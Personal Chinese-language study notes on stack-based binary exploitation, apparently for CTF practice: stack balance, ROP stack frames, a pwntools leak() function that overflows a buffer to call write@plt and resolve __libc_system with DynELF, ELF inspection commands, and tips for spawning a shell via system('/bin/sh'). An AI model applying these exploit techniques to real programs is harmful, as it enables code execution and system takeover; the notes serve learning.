堆栈平衡（程序正常工作）
调用子程序时先保存堆栈信息（某些堆栈相关的寄存器），待子程序返回后将堆栈恢复到调用前的状态（堆栈用于保存局部变量、函数参数等重要信息）

这是为了给下一次函数调用时不出错。

代码段和数据段分段存储，使用rop技术跳转后，栈桢默认由返回地址，1、2、3参数写payload

64位默认只有返回地址写入栈桢，且没有bp寄存器当栈底指针

write（1，address，length），栈先存入返回地址

read（0，address，length），栈先存入返回地址

puts（address），不限长度，但有截断问题


拿write函数来泄露地址
def leak(address):

  payload = "A" * number

  payload += p32(writeplt)

  payload += p32(返回地址，一般为main)

  payload += p32(1)

  payload += p32(address)

  payload += p32(4)

  p.send(payload)

  data = p.recv(4)

  print "%#x => %s" % (address, (data or '').encode('hex'))

  return data

print p.recvline()

dynelf = DynELF(leak, elf=ELF("./文件"))

systemAddress = dynelf.lookup("__libc_system", "libc") 


拿puts函数来泄露地址




vmmap查看各个段的权限

ldd，file 文件        查看文件总概

objdump -R 文件       查看动态重定位函数

objdump -r -d 文件    查看文件代码分类

string -a -t x 链接库 | grep '字符串'

readelf -s 链接库 | grep '函数'


有时system（）函数的参数可以是/bin/sh，也可以是sh，如果输入无法和后面隔开，加上 ; 

有时程序有可以直接调用shell的函数，如果返回地址指向函数头没用，就指向p参数输入的那一行
